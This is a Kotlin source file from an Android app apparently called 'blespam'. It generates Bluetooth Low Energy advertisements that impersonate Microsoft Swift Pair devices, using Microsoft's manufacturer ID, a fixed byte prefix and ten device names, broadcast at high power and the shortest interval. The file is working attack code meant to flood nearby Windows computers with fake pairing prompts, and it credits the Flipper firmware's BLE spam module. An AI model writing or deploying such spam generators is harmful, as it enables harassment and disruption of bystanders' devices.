package de.finnbusse.blespam.AdvertisementSetGenerators

import android.bluetooth.BluetoothDevice
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.AdvertisingSetParameters
import de.finnbusse.blespam.Callbacks.GoogleFastPairAdvertisingCallback
import de.finnbusse.blespam.Callbacks.GenericAdvertisingSetCallback
import de.finnbusse.blespam.Helpers.StringHelpers
import de.finnbusse.blespam.Models.AdvertisementSet
import de.finnbusse.blespam.Models.ManufacturerSpecificDataModel

class SwiftPairAdvertisementSetGenerator : IAdvertisementSetGenerator {

    // Generating Manufacturer Specific Data like found here:
    // https://github.com/Flipper-XFW/Xtreme-Firmware/blob/dev/applications/external/ble_spam/protocols/swiftpair.c

    private val _prependedBytes = StringHelpers.decodeHex("030080")
    private var _deviceNames = mutableListOf(
        "Device 1",
        "Device 2",
        "Device 3",
        "Device 4",
        "Device 5",
        "Device 6",
        "Device 7",
        "Device 8",
        "Device 9",
        "Device 10")

    private val _manufacturerId = 6 // 0x0006 == 6 = Microsoft
    override fun getAdvertisementSets(): List<AdvertisementSet> {
        var advertisementSets:MutableList<AdvertisementSet> = mutableListOf()

        _deviceNames.map {deviceName ->

            var advertisementSet:AdvertisementSet = AdvertisementSet()

            // Advertise Settings
            advertisementSet.advertiseSettings.advertiseMode = AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY
            advertisementSet.advertiseSettings.txPowerLevel = AdvertiseSettings.ADVERTISE_TX_POWER_HIGH
            advertisementSet.advertiseSettings.connectable = false
            advertisementSet.advertiseSettings.timeout = 0

            // Advertising Parameters
            advertisementSet.advertisingSetParameters.legacyMode = true
            advertisementSet.advertisingSetParameters.interval = AdvertisingSetParameters.INTERVAL_MIN
            advertisementSet.advertisingSetParameters.txPowerLevel = AdvertisingSetParameters.TX_POWER_HIGH
            advertisementSet.advertisingSetParameters.primaryPhy = BluetoothDevice.PHY_LE_1M
            advertisementSet.advertisingSetParameters.secondaryPhy = BluetoothDevice.PHY_LE_1M

            // AdvertiseData
            advertisementSet.advertiseData.includeDeviceName = false

            val manufacturerSpecificData = ManufacturerSpecificDataModel()
            manufacturerSpecificData.manufacturerId = _manufacturerId
            manufacturerSpecificData.manufacturerSpecificData = _prependedBytes.plus(deviceName.toByteArray())
            advertisementSet.advertiseData.manufacturerData.add(manufacturerSpecificData)
            advertisementSet.advertiseData.includeTxPower = false

            // Scan Response
            advertisementSet.scanResponse.includeTxPower = false

            // General Data
            advertisementSet.deviceName = deviceName

            // Callbacks
            advertisementSet.advertisingSetCallback = GenericAdvertisingSetCallback()
            advertisementSet.advertisingCallback = GoogleFastPairAdvertisingCallback()

            advertisementSets.add(advertisementSet)
        }

        return advertisementSets.toList()
    }
}